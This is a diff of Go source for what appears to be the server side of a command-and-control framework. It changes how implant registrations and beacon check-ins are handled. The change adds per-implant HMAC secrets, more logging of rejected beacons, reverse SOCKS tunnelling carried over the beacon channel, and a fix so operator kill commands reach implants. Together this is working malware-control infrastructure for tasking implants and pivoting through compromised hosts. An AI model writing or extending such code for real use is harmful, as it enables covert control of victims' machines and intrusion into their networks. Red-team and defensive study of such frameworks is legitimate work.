@@ -14,9 +14,36 @@ import (
 // ErrBeaconAuth is returned when HMAC validation fails (callers should drop silently).
 var ErrBeaconAuth = fmt.Errorf("beacon auth failed")
 
+// SecretResolver looks up the per-implant HMAC/wrap secret.
+// If nil, BeaconHandler.Secret is used as a legacy fleet-wide PSK.
+type SecretResolver func(implantID string) ([]byte, error)
+
+// SocksBridge multiplexes reverse SOCKS frames over the beacon channel.
+type SocksBridge interface {
+	DrainOutbound(sessionID string) []*pb.SocksFrame
+	RequeueOutbound(sessionID string, frames []*pb.SocksFrame)
+	HandleInbound(sessionID string, frames []*pb.SocksFrame)
+	Active(sessionID string) bool
+}
+
+// resolveSecret returns the implant auth secret for HMAC and session-key wrap.
+func resolveSecret(h *BeaconHandler, implantID string) ([]byte, error) {
+	if h.ResolveSecret != nil {
+		return h.ResolveSecret(implantID)
+	}
+	if len(h.Secret) > 0 {
+		return h.Secret, nil
+	}
+	return nil, fmt.Errorf("no implant secret")
+}
+
 // HandleRegister processes an implant registration.
 func HandleRegister(h *BeaconHandler, reg *pb.Register, protocol, remoteAddr string) (*pb.RegisterResponse, error) {
-	if err := zcrypto.VerifyHMAC(h.Secret, reg.ImplantId, reg.Timestamp, reg.Hmac, 30); err != nil {
+	secret, err := resolveSecret(h, reg.ImplantId)
+	if err != nil || len(secret) == 0 {
+		return nil, ErrBeaconAuth
+	}
+	if err := zcrypto.VerifyHMAC(secret, reg.ImplantId, reg.Timestamp, reg.Hmac, 30); err != nil {
 		return nil, ErrBeaconAuth
 	}
 	if h.ReplayCache != nil {
@@ -54,7 +81,7 @@ func HandleRegister(h *BeaconHandler, reg *pb.Register, protocol, remoteAddr str
 		}
 	}
 
-	encryptedKey, err := zcrypto.AESEncrypt(h.Secret, sessionKey)
+	encryptedKey, err := zcrypto.AESEncrypt(secret, sessionKey)
 	if err != nil {
 		return nil, fmt.Errorf("encrypt session key: %w", err)
 	}
@@ -72,23 +99,31 @@ func HandleRegister(h *BeaconHandler, reg *pb.Register, protocol, remoteAddr str
 
 // HandleBeacon processes an implant beacon check-in.
 func HandleBeacon(h *BeaconHandler, beacon *pb.Beacon) (*pb.BeaconResponse, error) {
-	if err := zcrypto.VerifyHMAC(h.Secret, beacon.ImplantId, beacon.Timestamp, beacon.Hmac, 30); err != nil {
+	secret, err := resolveSecret(h, beacon.ImplantId)
+	if err != nil || len(secret) == 0 {
+		return nil, ErrBeaconAuth
+	}
+	if err := zcrypto.VerifyHMAC(secret, beacon.ImplantId, beacon.Timestamp, beacon.Hmac, 30); err != nil {
+		log.Printf("[beacon] HMAC reject implant=%s: %v", beacon.ImplantId, err)
 		return nil, ErrBeaconAuth
 	}
 	if h.ReplayCache != nil {
 		if err := h.ReplayCache.CheckAndRecord(beacon.ImplantId, beacon.Timestamp); err != nil {
+			log.Printf("[beacon] replay reject implant=%s: %v", beacon.ImplantId, err)
 			return nil, ErrBeaconAuth
 		}
 	}
 
 	sess, ok := h.Sessions.GetByImplant(beacon.ImplantId)
 	if !ok {
+		log.Printf("[beacon] unknown implant=%s (not registered)", beacon.ImplantId)
 		return nil, ErrBeaconAuth
 	}
 
 	h.Sessions.UpdateCheckin(sess.SessionID)
 
 	var results []*pb.TaskResult
+	var inboundSocks []*pb.SocksFrame
 	if sess.SessionKey != nil {
 		if len(beacon.EncryptedResults) > 0 {
 			plaintext, err := zcrypto.AESDecrypt(sess.SessionKey, beacon.EncryptedResults)
@@ -100,6 +135,7 @@ func HandleBeacon(h *BeaconHandler, beacon *pb.Beacon) (*pb.BeaconResponse, erro
 					log.Printf("[beacon] unmarshal decrypted results error: %v", err)
 				} else {
 					results = payload.Results
+					inboundSocks = payload.SocksFrames
 				}
 			}
 		}
@@ -113,26 +149,43 @@ func HandleBeacon(h *BeaconHandler, beacon *pb.Beacon) (*pb.BeaconResponse, erro
 			h.Dispatcher.HandleResultForSession(sess.SessionID, result)
 		}
 	}
-
-	pendingTasks := sess.DrainTasks()
-
-	// 0 = implant keeps its current sleep; non-zero only when operator set interval.
-	resp := &pb.BeaconResponse{
-		NextCheckinMs: sess.NextCheckinMs(),
-		Terminate:     !sess.IsAlive(),
+	if h.Socks != nil && len(inboundSocks) > 0 {
+		h.Socks.HandleInbound(sess.SessionID, inboundSocks)
 	}
 
-	if sess.SessionKey != nil && len(pendingTasks) > 0 {
-		payload := &pb.BeaconTasksPayload{Tasks: pendingTasks}
+	pendingTasks := sess.DrainTasks()
+	var outboundSocks []*pb.SocksFrame
+	if h.Socks != nil {
+		outboundSocks = h.Socks.DrainOutbound(sess.SessionID)
+	}
+
+	// 0 = implant keeps its current sleep; non-zero only when operator set interval.
+	// Do not force a short interval for SOCKS here — implant shortens sleep when
+	// SocksActive() and a permanent NextCheckinMs=100 would stick after SOCKS stop.
+	// Terminate uses ShouldTerminate (operator kill), not mere Alive — UpdateCheckin
+	// would otherwise revive killed sessions before this flag is read.
+	resp := &pb.BeaconResponse{
+		NextCheckinMs: sess.NextCheckinMs(),
+		Terminate:     sess.ShouldTerminate(),
+	}
+
+	if sess.SessionKey != nil && (len(pendingTasks) > 0 || len(outboundSocks) > 0) {
+		payload := &pb.BeaconTasksPayload{Tasks: pendingTasks, SocksFrames: outboundSocks}
 		plaintext, err := proto.Marshal(payload)
 		if err != nil {
 			log.Printf("[beacon] marshal tasks payload error: %v", err)
 			sess.RequeueTasks(pendingTasks)
+			if h.Socks != nil {
+				h.Socks.RequeueOutbound(sess.SessionID, outboundSocks)
+			}
 		} else {
 			encrypted, err := zcrypto.AESEncrypt(sess.SessionKey, plaintext)
 			if err != nil {
 				log.Printf("[beacon] encrypt tasks error: %v", err)
 				sess.RequeueTasks(pendingTasks)
+				if h.Socks != nil {
+					h.Socks.RequeueOutbound(sess.SessionID, outboundSocks)
+				}
 			} else {
 				resp.EncryptedTasks = encrypted
 			}
